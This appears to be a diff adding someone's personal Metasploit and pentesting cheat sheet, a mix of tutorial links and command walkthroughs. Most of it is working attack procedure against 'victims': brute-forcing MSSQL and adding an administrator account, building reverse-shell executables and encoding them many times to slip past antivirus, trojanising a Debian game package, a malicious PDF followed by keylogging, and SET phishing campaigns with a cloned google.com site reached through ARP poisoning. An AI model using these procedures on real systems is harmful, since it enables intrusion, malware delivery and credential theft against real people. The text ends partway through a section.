@@ -1,0 +1,2020 @@
+Metasploit online training:
+
+http://www.offensive-security.com/metasploit-unleashed/Metasploitable
+http://blog.metasploit.com/2010/05/introducing-metasploitable.html
+http://www.securitytube.net/groups?operation=view&groupId=8
+
+
+http://www.offensive-security.com/metasploit-unleashed/
+
+* Stack based overflows (direct RET overwrite) :
+(Tutorial Part 1)
+http://www.corelan.be:8800/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
+
+* Jumping to shellcode :
+(Tutorial Part 2)
+http://www.corelan.be:8800/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/
+
+* Stack based overflows - SEH
+(Tutorial Part 3)
+http://www.corelan.be:8800/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/
+
+* Stack based overflows - SEH part 2
+(Tutorial Part 3b)
+http://www.corelan.be:8800/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/
+
+* Writing Metasploit exploits
+(Tutorial Part 4)
+http://www.corelan.be:8800/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/
+
+* Using debuggers to speed up exploit development
+(Tutorial Part 5)
+http://www.corelan.be:8800/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/
+
+* Bypassing Stack Cookies, Safeseh, NX/DEP and ASLR
+(Tutorial Part 6)
+http://www.corelan.be:8800/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/
+
+* Writing stack based unicode exploits
+(Tutorials Part 7)
+http://www.corelan.be:8800/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/
+
+
+Online wikibook with various articles about Metasploit
+http://en.wikibooks.org/wiki/Metasploit/Contents
+
+milw0rm		-lots of metasploit modules
+http://www.milw0rm.com
+
+Exploit site like milworm:
+exploit-db.org
+
+New options in the console
+http://pauldotcom.com/2009/12/new-options-in-msfconsole-sess.html
+
+
+http://pauldotcom.com/2009/12/meterpreter-pivoting-improved.html
+http://pauldotcom.com/2009/12/metasploit-payload-format-galo.html
+
+
+Books
+	The Shellcoders Handbook	-writing shellcode and developing exploits
+					 ISBN 0764544683
+	Sockets, Shellcode, Porting and Coding	-developing exploits, shellcode, and even 
+						 has a section on Metasploit
+						 ISBN 1597490059
+
+******************************************************************************************
+Metasploit
+    Basic Syntax:	
+	show exploits
+	info <exploit name>
+	use <exploit name>
+	show PAYLOADS
+	set PAYLOAD <payload>
+	show options
+	set <options that are required>
+	exploit
+
+    Show existing sessions:
+	sessions -l    #list sessions
+	sessions -i 1  #pick session to connect to
+	sessions -l -v #list all sessions and what exploit was successful
+
+    Set Metasploit to act as web server for "OWNING" a victim browser
+	use auxiliary/server/browser_autopwn
+	set LHOST 192.168.1.100
+	set SRVPORT 80
+	set URIPATH notevil
+	exploit
+		Now visit http://192.168.1.100/notevil
+
+
+
+    Autopwn
+	autopwn for metasploit will take output from nessus and use it in metasploit to exploit vulnerabilities
+	Nessus -> Metasploit:
+	http://gentoo-wiki.com/Metasploit
+	http://blog.metasploit.com/2006/09/metasploit-30-automated-exploitation.html
+
+    fast-track - automate setting up the autopwn process - has gui or console mode
+	fast-track.py run first...
+	    inside metasploit:
+		# Set up Postgresql:
+		# su - postgres
+		# createuser -d -a -P root
+		#
+		# -if you receive a server.crt error when trying to use metasploit with postgresql:
+		#  set 'ssl = false' in the /etc/postgresql/8.4/main/postgresql.conf file
+		#
+		#  /etc/init.d/postgresql-8.4 start
+		#
+		#apt-get install libpq-dev #or is it libpg-dev?
+		#
+		#Get password from /opt/framework3/config/database.yml
+		/opt/framework3/posgresql/bin/psql -U msf3 -d msf3 &   # or ctrl-z to put in the background
+		#	default PW in database.yml ->  c478172d
+		msfconsole		#didn't use ./
+		db_status
+		db_driver postgresql
+		db_connect "user":"db password"@127.0.0.1:7175/"db name"    db_connect msf3:c478172d@127.0.0.1:7175/msf3
+		workspace -a <Workspace Name>
+		workspace <Workspace Name from above> 	#select the workspace you want
+		db_nmap 192.168.1.1-255 -p1-65535
+		load db_autopwn
+		db_autopwn -p -t -e
+		sessions --v 	#displays the exploits which were used to pwn the machine.
+
+    Metasploit 3 scanning modules
+	scanning mixins/modules
+
+    Redirect HTTP requests to "intranet"
+    Return HTML page with UNC link
+       	IE 5/6/7 <img src="\\ip\share\i.jpg">
+	Firefox  mozicon-url:file:///ip/share/i.jp
+
+
+    When the number of exploits doesn't increase with an update.  This is caused by the module cache not
+	updating after an upgrade.  To fix:
+		rm -rf ~/.msf3/modcache
+
+
+    exploit
+	-e	specify encoder
+	-n	specify nop generator
+	-p	specify payload
+	-t	specify target ID (xp, vista, etc)
+	-z	don't interact with post exploit session
+	-j	run as a job
+	-o	VAR=VAL options (alt. to set/unset)
+	-h	help
+
+   CTRL-Z		place an exploit session in the backgroud so you can access 
+		later
+
+
+    jobs		passive exploit, -j to exploit, autopwn, capture plugins
+	-l	list all jobs
+	-k <id>	kill jobs
+
+
+Generate a payload
+generate	-b		bad characters (to avoid)
+		-e <enc>	use specific encoder
+		-s		NOP sled length
+		-o <VAR=VAL>	specify options
+		-t <ruby|c|perl|raw>	output type
+		-f <file_name>	save output to a file
+	generate -e x86/shikata_ga_nai -t 
+
+
+Nop modules	A NOP is a 'padding' in memory to reserve 4 byte segments in 
+		memory so they always 'align'.  For example, 1026k bytes would
+		need padding to align the 4 byte segments to 1028k
+generate	-b		bad characters (to avoid)
+		-s		registers to save
+		-t <ruby|c|perl|raw>	output type
+	use nop/x86/opty2
+	generate -b "\x00" -s eax -t c 10
+
+
+Auxiliary Modules	-scanning, spoofing, etc
+	Set "ACTION" instead of "TARGET"
+run		-a		action to use
+		-j		run as a job
+		-o		options in the VAR=VAL format
+	use auxiliary/scanner/http/version
+	show options
+	set RHOSTS 1.1.1.0/24
+	set THREADS 50
+	run
+
+	http://ratproxy.googlecode.com/files/ratproxy-1.51.tar.gz
+
+	use auxiliary/server/capture/ftp	-sets up ftp site to capture passwords
+
+	use auxiliary/admin/webmin/file_disclosure	-get /etc/password thru webmin
+
+	use auxiliary/server/browser_autopwn
+
+	SET - http://www.social-engineer.org
+
+
+Plugin Management
+	load msfd ServerPort=6453	load a module
+	unload msfd			unload a module
+
+	ips_filter
+		load ips_filter
+		use exploit/windows/dcerpc/ms03_026_dcom
+		set PAYLOAD windows/shell/bind_tcp
+		exploit
+		*** Matched IPS signature REMACT
+		*** Outbound write blocked due to possible signature match
+
+
+	msfencode <options>
+		-e	encoder to use
+		-c 	number of times to encode
+		-i 	input file
+		-b	bad characters (to avoid)
+		-s	max size
+		-a	architecture to encode for
+		-m	module search path
+		-n	print encoder information
+		-o	output file
+		-t	output file type (c, perl, ruby, raw, exe, elf, vba, java)
+		./msfencode x86/shikata_ga_nai -i payload.bin -t c
+
+
+
+Databases	Ability to store host information/"Knowledge base"
+		import nmap (xml), Nessus (nbe), THC-amap
+	db_create testdb
+	db_add_host 1.1.1.1
+	db_add_port 1.1.1.1 80 tcp
+
+	db_connect		connect to existing database
+	db_disconnect		disconnect from database
+	db_destroy		delete a database
+	db_hosts		list hosts
+	db_services		db_services
+	db_notes		list nosts
+	db_driver		select a database driver
+
+	db_import_nmap_xml output.xml	import nmap scan
+		nmap -oX		option used with nmap to create output
+	db_import_nessus_nbe report.nbe	import nessus scan
+	db_import_amap_mlog amap-scan	import amap scan
+		amap -o -m		option used with amap to create output
+
+	db_autopwn
+		-t	list matching modules
+		-x	match based on vuln references
+		-p 	match based on port
+		-e	lanuch exploits
+		-r	reverse shell payload
+		-b 	bind shell payload
+		-I	only target hosts inside a range
+		-X	exclude hosts in a range
+
+
+******************************************************************************************
+MSF usage:
+
+   MSFCONSOLE
+   ----------	
+	help		-help or ? at the msf command prompt will display listing of available commands 
+	tab completion	-completes commands for you
+	show		-displays every module within Metasploit
+	show auxiliary	-lists all of the available auxiliary modules within Metasploit.  i.e. scanners,
+			 denial of service modules, fuzzers, etc
+	show evasion	-
+	show payloads	-display all of the different payloads for all the platforms available 
+	show options	-displays which settings are available and/or required for that specific module
+	show targets	-show what OS targets are supported for a particular exploit
+	show advanced	-move advanced options to fine-tune an exploit
+	search		-msfconsole includes an extensive regular-expression based search functionality.
+			 i.e.  search ms09-001
+	info		-provides detailed information about a particular module including all options,
+			 targets, and other information.  i.e. info dos/windows/smb/ms09_001_write
+	use		-when you have decided on a particular module to make use of, issue the use
+			 command to select it.  i.e. use dos/windows/smb/ms09_001_write
+	connect		-can be used to connect to a remote host from within the msfconsole the same as 
+			 you would with nc or telnet.  i.e. connect 10.1.1.1 23
+	set		-used to configure the options and settings of the module you are currently
+			 working with.  i.e. set RHOST 10.0.0.1
+	show encoders	-lists available encoders for use at run-time.  
+	set encoders	-set an encoder to use at run-time.  This is particularly useful in exploit
+			 development when you aren't quite certain as to which payload encoding methods
+			 will work with an exploit.
+	check		-checks to see if a target is vulnerable to a particular exploit instead of 
+			 actually exploiting it.  Very few exploits support this.
+	setg		-in order to save a lot of typing during a pentest, you can set global variables 
+			 within msfconsole. You can do this with the 'setg' command. Once these have been 
+			 set, you can use them in as many exploits and auxiliary modules as you like. You 
+			 can also save them for use the next time your start msfconsole. However, the 
+			 pitfall is forgetting you have saved globals, so always check your options before 
+			 you 'run' or 'exploit'. Conversely, you can use the 'unsetg' command to unset a 
+			 global variable.  i.e.: 
+				setg LHOST 10.1.1.1
+				setg RHOST 10.2.2.2
+				save
+	back		-once you have finished working with a particular module, or if you inadvertently 
+			 select the wrong module, you can issue the 'back' command to move out of the 
+			 current context.
+	resource	-some attack such as karmetasploit use a resource file that you can load through 
+			 the msfconsole using the 'resource' command.  These files are a basic scripting
+			 for msfconsole.  It runs the commands in the file in sequence.  i.e.:
+				resource karma.rc
+				load db_sqlite3
+				db_create /root/karma.db
+				use auxiliary/server/browser_autopwn
+				setg AUTOPWN_HOST 10.0.0.1
+	irb		-drops you into ruby scripting mode where you can issue commands and create 
+			 scripts on the fly
+
+   msfcli
+   ------
+	msfcli -h	-Shows usage and help
+		(S)ummary      Show information about this module
+		(O)ptions      Show available options for this module
+		(A)dvanced     Show available advanced options for this module
+		(I)DS Evasion  Show available ids evasion options for this module
+		(P)ayloads     Show available payloads for this module
+		(T)argets      Show available targets for this exploit module
+		(AC)tions      Show available actions for this auxiliary module
+		(C)heck        Run the check routine of the selected module
+		(E)xecute      Execute the selected module
+		./msfcli exploit/windows/http/icecast_header PAYLOAD=windows/shell/ reverse_tcp RHOST=1.1.1.1 LHOST=2.2.2.2 135 E
+
+	Variables are assigned using '=' and that options are case-sensitive
+		./msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.115 PAYLOAD=windows/shell/bind_tcp E
+
+	If you aren't entirely sure about what options belong to a particular module, you can append the 
+	letter 'O' to the end of the string at whichever point you are stuck.
+		./msfcli windows/smb/ms08_067_netapi O
+			[*] Please wait while we load the module tree...
+
+		   	Name     Current Setting  Required  Description
+			----     ---------------  --------  -----------
+			RHOST                     yes       The target address
+			RPORT    445              yes       Set the SMB service port
+			SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+	To display the payloads that are available for the current module, append the letter 'P' to the
+	command-line string
+		./msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.115 P
+
+	It also doesn't support any of the advanced automation features of msfconsole. 
+
+
+   msfweb
+   ------
+	-a	listen on address; default is 127.0.0.1
+	-d	run the server as a daemon
+	-p	port to list on; default is 55555
+	-s	automatically spawn a browser
+
+
+   msfrpcd		a daemon that runs and listens for an XMLRPC client.
+   -------
+	-a	address to listen on
+	-p	port to listen on 
+	-f	run server in the foreground
+	-U	specify username
+	-P 	specify password
+	-S	disable SSl
+
+   msfrpc		the client piece for msfprcd
+   ------
+	-a	address to listen on
+	-p	port to listen on 
+	-U	specify username
+	-P 	specify password
+	-S	disable SSl
+	
+	rpc.call("core.version")
+	session.list
+	job.list
+	module.options
+	module.payloads
+	modules.exploits
+
+
+
+	
+******************************************************************************************
+Dradis Framework on Ubuntu
+
+Dradis is an open source framework for sharing information during a pentest.  It is more than a 
+	note-taking application.  It can import NMap and Nessus result files, etc.
+
+To install dependencies:
+	apt-get install ruby irb rdoc ruby1.8-dev libopenssl-ruby rake rubygems install libsqlite3-0 libsqlite3-dev libwxgtk2.8-0 libwxgtk2.8-dev
+	apt-get remove rake
+	
+	PATH=$PATH:/var/lib/gems/1.8/bin/
+	export PATH
+	
+	gem install sqlite3-ruby wxruby rake
+
+To install dradis:
+	mkdir svn/dradis-trunk
+	cd svn/dradis-trunk/
+	svn co https://dradis.svn.sourceforge.net/svnroot/dradis/server/trunk server
+	svn co https://dradis.svn.sourceforge.net/svnroot/dradis/client/trunk client 
+	cp server/config/database.yml.template server/config/database.yml
+	cd server
+	rake db:migrate
+
+To run dradis:
+	cd svn/dradis-trunk/server
+	ruby ./script/server
+
+	https://localhost:3004
+		For the first time you will be prompted to create a user name and password
+
+	Now edit the svn/dradis-trunk/client/conf/dradis.xml file and insert the username and password you created above
+
+	To launch the client:
+		cd svn/dradis-trunk/client
+		ruby ./dradis.rb
+
+		
+******************************************************************************************
+In depth Metasploit usage:
+
+
+Populating a 'Tracking' database in Metasploit with information that is found via nmap, etc.
+
+	db_create
+	load db_tracker
+	help					#This will show you what info can be put in the DB
+	nmap -v -sS -sV -O -p1-65535 10.1.1.1 -oA subnet_1  	#subnet_1 is the output file name
+								 This create 3 output file formats
+	db_import_nmap_xml subnet_1.xml		#This imports the nmap xml file		
+
+Run db_hosts and db_services to see the results of the nmap scan
+	db_hosts
+	db_services
+
+Import the nmap output into Dradis:
+	Open the dradis client and execute the following command:
+		import nmap ~/svn/msf3-dev/subnet_1.nmap normal
+			or
+		import nmap ~/svn/msf3-dev/subnet_1.xml normal
+			or
+		Import the file through the GUI hitting the 'Import from file' button
+
+Portscanning:
+	Metasploit has several different Port Scanning Options:
+		search portscan
+
+	Syn scan:
+		use scanner/portscan/syn
+		show options
+		set INTERFACE eth0
+		set PORTS 1-65535
+		set RHOSTS 10.1.1.1-10.1.1.255
+		set THREADS 50
+		run
+
+	Samba Versioning:
+		use scanner/smb/version
+		set RHOSTS 10.1.1.1-10.1.1.255
+		set THREADS 50
+		run
+
+	If we issue a db_hosts now we will see the new OS information included in the output
+
+MS SQL:
+	When MSSQL installs, it installs either on port 1433 TCP or a randomized dynamic TCP 
+	port. If the port is dynamically generated, you can use UDP port 1434 UDP.  You can 
+	pull quite a bit of information about the SQL server including what port the TCP 
+	listener is on. 
+		search mssql
+		use scanner/mssql/mssql_ping
+		show options
+		set RHOSTS 10.1.1.1-10.1.1.255
+		set THREADS 50
+		run
+	
+	The ServerName, TCP Port, SQL Version and if this is a clustered version will be 
+	displayed.
+
+	At this point you could use 'scanner/mssql/mssql_login' module to brute-force the
+	password by using a dictionary file.  Alternately, you could use medusa or hydra.
+		back
+		use scanner/mssql/mssql_login
+		show options
+		set MSSQL_PASS_FILE /path/to/dictionary/file.txt
+		set RHOSTS 10.1.1.1-10.1.1.255
+		set THREADS 1
+
+	This takes a long time!  Adding more Threads appears to actually slows this process 
+	down.
+
+	Now that you have the password we can get a remote shell through MS SQL
+		back
+		use admin/mssql/mssql_exec
+		show options
+		set RHOST 10.1.1.1-10.1.1.255
+		set MSSQL_PASS <password>
+		set CMD net user jimmy <password> /ADD
+		exploit
+
+	This would add the account jimmy.  We could then issue a command to add the jimmy account
+	to the local administrators group.
+		set CMD net localgroup administrators jimmy /ADD
+		exploit
+
+	We would now have full control over this system.
+
+Service Identification:
+	Metasploit includes a ton of scanners for helping determine vulnerable services on target
+	machines
+		back
+		search auxiliary scanner
+		
+	SSH:
+	We can use the ssh_version scanner to scan hosts with SSH on them.  We'll use the grepable
+	output file and pass it to the RHOSTS:
+		use scanner/ssh/ssh_version
+		show options
+		cat subnet_1.gnmap |grep 22/open |awk '{print $2}' > /tmp/22_open.txt 
+		set RHOSTS file:/tmp/22_open.txt
+		set THREADS 50
+		run
+
+	FTP:
+	FTP Servers are often configured to allow anonymous access on port 21.  It is always a good 
+	idea to check for it:
+		back
+		use scanner/ftp/anonymous
+		show options
+		set RHOSTS 10.1.1.1-10.1.1.255
+		set THREADS 10
+		run
+
+
+Password Sniffing:
+	Metasploit includes psnuffle which is similar to dsniff.  It will also process PCAP files!!!
+		back
+		use auxiliary/sniffer/psnuffle
+		show options
+
+
+SNMP Sweeping:
+	If you can "guess" the read-only or read-write SNMP strings you can obtain lots of information. 
+	The scanner/snmp/community module will attempt to brute force Community strings.  On a Windows 
+	box you can extract patch levels, services running, last reboot time, usernames, etc.
+		back
+		search snmp
+		use scanner/snmp/community
+		show options
+		set RHOSTS 10.1.1.1-10.1.1.255	
+		set THREADS 10
+		run
+
+	When querying through SNMP, the MIB allows you to query the device and extract information. 
+	Metasploit comes loaded with a list of default MIBs that it has in its database, it uses them 
+	to query the device for more information depending on what level of access is obtained.
+
+SMB Login Check:
+	You have a valid username and password combination but want to know where else you can use it.
+	The auxiliary/scanner/smb/login module will connect to a range of hosts and determine if your
+	username and password will work on these other hosts.
+		back
+		use auxiliary/scanner/smb/login
+		show options
+		set RHOSTS 10.1.1.1-10.1.1.255
+		set SMBUser victim
+		set SMBPass s3cr3t
+		set THREADS 50
+		run
+
+VNC Authentication:
+	The vnc_none_auth module searches a range of IP's looking for VNC server that does not have a 
+	password configured on it.
+		back
+		use scanner/vnc/vnc_none_auth
+		show options
+		set RHOSTS 10.1.1.1-10.1.1.255
+		set THREADS 50
+		run
+
+VNC DLL injection:
+	will allow you to proxy VNC connection through metasploit.
+	point your VNC Client to metasploit box and it will connect to victim
+	Otherwise, it just gives you a VNC remote desktop from attacking box
+		use windows/vncinject
+		show options
+		run or exploit?	
+
+Open X11:
+	The Open_X11 scanner module scans a target range for X11 servers that will allow a user to 
+	connect without any authentication.
+		back
+		use scanner/x11/open_x11
+		show options
+		set RHOSTS 10.1.1.1-10.1.1.255
+		set THREADS 50
+		run
+	
+	Once found you can use xspy to monitor keystrokes
+		./xspy -display 10.1.1.1:0 -delay 100
+
+	xspy is installed by default on the Backtrack CD
+
+
+Add a user payload, automatically puts then in Administrators group
+	set PAYLOAD windows/adduser
+	set USER testaccount
+	set PASS abc123
+	exploit
+
+spawn a shell
+	windows/shell
+
+Execute a command
+	windows/exec
+	set CMD "C:\\windows\\system32\\mspaint.exe"
+
+Download and execute
+	windows/download_exec
+	
+
+Upload and execute
+	windows/upexec
+
+DLL injection 	-run code in an existing proces
+	windows/dllinject
+
+
+
+
+WMAP Web Scanner:
+	WMAP is a web vulnerability scanner that has the ability to take a proxy and pipe the output
+	and captured data and perform vulnerability analysis.  This module is a little bit buggy and 
+	should not be used in place of a real web scanner.  We will use ratproxy for data capture.
+		./msfconsole
+		db_driver sqlite3
+		db_create wmap.db
+		load db_wmap
+		db_connect wmap.db
+
+	In another terminal open ratproxy and point it to the database created above:
+		./ratproxy -v /tmp/ -b wmap.db
+	
+	Open firefox and configure it to use the local proxy on port 8080.  Now browse through the
+	site.  Make sure you populate the DB with lots of info for Metasploit to work with.
+
+	Once we finish browsing the site.  Look to see what was captured:
+		wmap_targets -r		#Shows what IP's were captured
+		wmap_targets -p		#Shows what Host and Port is used
+		wmap_targets -s 1	#Selects target '1' from wmap_targets -p
+		wmap_website		#Shows a 'tree' of the site
+		wmap_run -t		#loads all of the modules for use with wmap????
+		wmap_run -e		#Executes the attack
+
+	WMAP will now use the database file that we have pointed ratproxy to and created with 
+	Metasploit and start attacking the website. This generally takes a while as there are a 
+	significant amount of attacks through WMAP. Note that some of the checks are not reliable and 
+	take a long time to complete. To break out of a specific auxiliary module, just hit "control-c" 
+	and it will move on to the next auxiliary module.
+
+	Look at what was discovered
+		wmap_reports
+		wmap_reports -p		#Print all available reports
+		wmap_reports -s 1	#Select report 1 to display
+
+
+	Basic syntax for testing…(wmap_reports wasn't working from the above example):
+		load db_sqlite3
+		db_connect wmap_db
+		load db_wmap
+		wmap_targets -r
+		wmap_targets -p
+		wmap_targets -s1
+		wmap_targets -p
+		wmap_run -t
+		wmap_run -e
+		wmap_reports -p
+	
+
+
+
+Nessus:
+	Nessus scans can be imported into Metasploit using the nbe file format.
+	Perform a Nessus scan against the targets and export the report to the nbe format
+		./msfconsole
+		db_create
+		load db_tracker
+		db_import_nessus_nbe ~/report.nbe
+		db_services
+		db_vulns
+
+	db_autopwn will read all of the ports, services, and vulnerabilities contained within the nbe 
+	results file, match exploits that are compatible with them, and try to exploit them all 
+	automadically.
+		db_autopwn -h		#Help
+			-t	Show all matching exploit modules
+			-x	Select modules based on vulnerability references
+			-p	Select modules based on open ports
+			-e	Launch exploits against all matched targets
+			-r	Use a reverse connect shell
+			-b	Use a bind shell on a random port (default)
+			-q	disable exploit module output
+		db_autopwn -x -e	#-e Launch exploits against all 
+
+	If an exploit is successful than a remote shell will be established
+		sessions -l
+		sessions -v 	#displays the exploits which were used to pwn the machine.
+		sessions -i 1
+		sessions -c <command>	#Runs a command on ALL systems owned
+		sessions -s <command>	#Runs a meterpreter script
+		sessions -k <id>	#Kills a session
+		
+
+	A meterpreter prompt should appear and give you the ability to execute commands
+		sysinfo
+		getuid
+		execute -f cmd.exe -i
+		etc, etc, etc
+
+
+Client side exploits:
+	Binary Windows Payloads:
+		Create an executable that can be executed on a windows box that will generate a 
+		reverse shell that will connect back to the attacker:
+			./msfpayload windows/shell_reverse_tcp O
+			./msfpayload windows/shell_reverse_tcp LHOST=10.1.1.1 LPORT=31337 O
+			./msfpayload windows/shell_reverse_tcp LHOST=10.1.1.1 LPORT=31337 X > /tmp/revshell.exe
+			file /tmp/1.exe
+				/tmp/revshell.exe: MS-DOS executable PE  for MS Windows (GUI) Intel 80386 32-bit
+		The Winodws executable is ready to go.  Now we must use a 'multi/handler' which will handle 
+		exploits that are launched outside of the framework
+			./msfconsole
+			use exploit/multi/handler
+			show options
+			set payload windows/shell/reverse_tcp
+			show options
+			set LHOST 10.1.1.1
+			set LPORT 31337
+			exploit
+		Now when the revshell.exe gets executed on the victim machine it will spawn a shell back to the 
+		framework
+
+
+	Anti-Virus ByPass:
+		Some AV will detect the revshell.exe file that we created above as malware.exe  Let's encode the *.exe 
+		file to make it harder for the AV to discover.
+			./msfencode -h		#help
+				-a   The architecture to encode as
+    				-b   The list of characters to avoid: 'x00xff'
+				-c   The number of times to encode the data
+				-e   The encoder to use
+				-i   Encode the contents of the supplied file path
+				-l        List available encoders
+				-m   Specifies an additional module search path
+				-n        Dump encoder information
+				-o   The output file
+				-s   The maximum size of the encoded data
+				-t   The format to display the encoded buffer with (raw, ruby, perl, c, exe, vba)	
+		
+			List available encoders:
+			./msfencode -l 
+		
+			Encode once:
+			./msfpayload windows/shell_reverse_tcp LHOST=10.1.1.1 LPORT=31337 R | ./msfencode -e x86/shikata_ga_nai -t exe > /tmp/revshell2.exe
+
+			If AV still detects it...use 3 different encoders, two of which we will run through 10 times each, for a total of 21 encodes:
+			./msfpayload windows/shell_reverse_tcp LHOST=10.1.1.1 LPORT=31337 R | ./msfencode -e x86/shikata_ga_nai -t raw -c 10 \ 
+			| ./msfencode -e x86/call4_dword_xor -t raw -c 10 | ./msfencode -e x86/countdown -t exe > /tmp/revshell3.exe
+		
+			If AV still detects it...use reverse_tcp instead of shell_reverse_tcp
+			./msfpayload windows/shell/reverse_tcp  LHOST=192.168.0.100 LPORT=31337 X > /tmp/revshell4.exe
+
+			One more thing to try
+			./msfpayload windows/shell_reverse_tcp LHOST=10.1.1.1 LPORT=31337 R | ./msfencode -x -c 5 -e x86/shikata_ga_nai -t exe > /tmp/revshell2.exe
+
+
+	Binary Linux Trojans:
+		We will package a payload in a Ubuntu *.deb package:
+			apt-get --download-only install freesweep
+			mkdir /tmp/evil
+			mv /var/cache/apt/archives/freesweep_0.90-2_i386.deb /tmp/evil
+			cd /tmp/evil/
+		
+		Now we need to extract the package to a working directory and create a working directory to hold our payload
+			dpkg -x freesweep_0.90-2_i386.deb work
+			mkdir work/DEBIAN
+			cd work/DEBIAN
+
+		In the DEBIAN directory, create a file named 'control' that contains the following:
+			Package: freesweep
+			Version: 0.90-1
+			Section: Games and Amusement
+			Priority: optional
+			Architecture: i386
+			Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
+			Description: a text-based minesweeper
+			
+		Create a post-installation script that will execute our binary.  In the DEBIAN directory create a 'postinst' 
+		file and put the following in it:
+			#!/bin/sh
+			sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &
+
+		Now we will create the payload.  A reverse shell to connect back to us name 'freesweep_scores':
+			./msfpayload linux/x86/shell/reverse_tcp LHOST=10.1.1.1 LPORT=4433 X > /tmp/evil/work/usr/games/freesweep_scores
+
+		Build the package:
+			chmod 755 /tmp/evil/work/DEBIAN/postinst
+			dpkg-deb --build /tmp/evil/work
+			mv /tmp/evil/work.deb /tmp/evil/freesweep.deb
+		
+		Now we must use a 'multi/handler' which will handle exploits that are launched outside of the framework:
+			./msfcli exploit/multi/handler PAYLOAD=linux/x86/shell/reverse_tcp LHOST=10.1.1.1 LPORT=4433 E
+
+		Once the victim installs and plays the game, you will receive a shell.
+		I had trouble getting this to work.
+
+
+	Client Site Attack / Malicious PDF
+		Create a malicious PDF file:
+			./msfconsole
+			use exploit/windows/fileformat/adobe_utilprintf
+			set FILENAME BestComputers-UpgradeInstructions.pdf
+			set PAYLOAD windows/meterpreter/reverse_tcp
+			set LHOST 10.1.1.1
+			set LPORT 4455
+			show options
+			exploit		
+		The malicious PDF file should be created in your ~/metasploit/data/exploits/ directory
+		Use the multi handler listener to listen for incoming connections:
+			use exploit/multi/handler
+			set PAYLOAD windows/meterpreter/reverse_tcp
+			set LHOST 10.1.1.1
+			set LPORT 4455
+			exploit
+		Now that you have a shell on the victim computer through the PDF we will want to move the shell to a 
+		different process so that when the victim closes Adobe we won't lose our shell.
+			ps
+			migrate 1520
+			sysinfo
+			use priv
+			keyscan_start
+			keyscan_dump
+
+
+	Social Engineering Toolkit (SET)
+		SET incorporates many useful Social-Engineering attacks all in one simplistic interface. The main purpose 
+		of SET is to automate and improve on many of the social-engineering attacks out there.  To install SET:
+			svn co http://svn.thepentest.com/social_engineering_toolkit/ SET/
+			./set
+		You must update the ~/SET/config/set_config file for the following items:
+			point to the correct path for your Metasploit installation		
+			set the SendMail option to SENDMAIL=ON
+		Or create a gmail account and use it to relay the e-mail for you.
+		
+		Scenario 1 - 	You want to send a blast of e-mails to numerous victims in the hope that they will open your 
+				attachment and ultimately give you access to their systems.
+			Create a list of e-mail addresses in /tmp/list.txt in the format below:
+				jimmy@email.com
+				bob@aol.com
+				joeboo@example.com
+			Be sure not to have any spaces or empty lines at the end of the above file.				
+
+			Launch SET, create a payload to connect back to you:
+				./set
+				1  Automatic E-mail Attacks
+				1  Perform a Mass Email Attack
+				yes  Do you want to create a payload now
+				4  Adobe PDF Embedded EXE Social Engineering
+				1  Windows Reverse TCP Shell
+					IP: 10.1.1.1
+					Port: 4444
+				2  Rename the file, I want to be cool
+					<file name>.pdf
+				yes  Would you like to start Sendmail
+				2  E-mail Attack Mass Mailer
+				6  LOL...have to check this out...
+				/tmp/list.txt
+				1  Use a GMAIL Account for your email attack
+				user@gmail.com
+				<password>
+				yes  Do you want to setup a listener
+
+				Once the victim receives and opens the PDF you should get a shell back in your listener.
+		
+		Scenario 2 - 	Create a fake web-site that serves up a Metasploit Payload and once the victim visits it, we serve 
+				a Java Applet "signed" by the Microsoft Corporation and if they accept it, our payload is delivered. 
+				Another instance we can use if we are on the inside of the network is an automatic ARP cache poison 
+				to where we can have SET poison a victim on the subnet and replace all the HREF's of the victim with 
+				our website.
+			Launch SET, create a website attack:
+				./set
+				2  Website Java Applet Attacks
+				1  Let SET create a website for you
+				2  Windows Reverse_TCP Meterpreter
+				2  shikata_ga_nai
+				2  How many times do you want to encode the payload
+				4444  Enter the PORT of the listener
+				
+				Now visit the site you just created on port 80.  If the Victim accepts the Java Applet you will get
+				a Meterpreter Payload back.
+
+			Taking this a step further lets clone a site like Google so that the victim believes they are accessing the
+			www.google.com website but in reality they are accessing our site with our malicious java applet:
+				./set
+				2  Website Java Applet Attacks
+				2  Clone and setup a fake website
+				http://www.google.com  Enter the url to clone
+				2  Windows Reverse_TCP Meterpreter
+				2  shikata_ga_nai
+				2  How many time do you want to encode the payload
+				4444  Enter the PORT of the listener
+
+				Now visit the site you just created on port 80.  You will see the google.com web site and if the 
+				victim accepts the Java Applet you will get a Meterpreter Payload back all the while the victim 
+				thinks that they accessed the google.com web site.
+
+			Take this even another step further.  Lets use Ettercap to actually redirect the user to our site via ARP
+			poisoning.  If the user attempts to access google.com, they will see the google.com website but actually
+			be redirected to our site with our malicious JAVA applet.
+				First, install Ettercap.  Now we need to modify the ~/SET/config/set_config file to match the 
+				following items:
+					ETTERCAP=ON
+					ETTERCAP_INTERFACE=<interface to use>
+				
+				./set
+				2  Website Java Applet Attacks
+				2  Clone and setup a fake website
+				http://www.google.com  Enter the url to clone
+				2  Windows Reverse_TCP Meterpreter
+				2  shikata_ga_nai
+				2  How many time do you want to encode the payload
+				4444  Enter the PORT of the listener
+				<IP of Victim>  What IP Address do you want to poison
+		
+				Now when the Victim tries to access google.com they get redirected to our site without their 
+				knowledge.  And once again, if they accept the Java Applet we own them.
+
+
+	VBScript Infection Methods  
+		Use VBScript to infect a Word or Excel doc so that you can more easily bypass filters.  By default Macros are 
+		disabled in Office 2003.  So, unless you know that Macros are enabled this is not the best attack vector.
+			Create the payload:
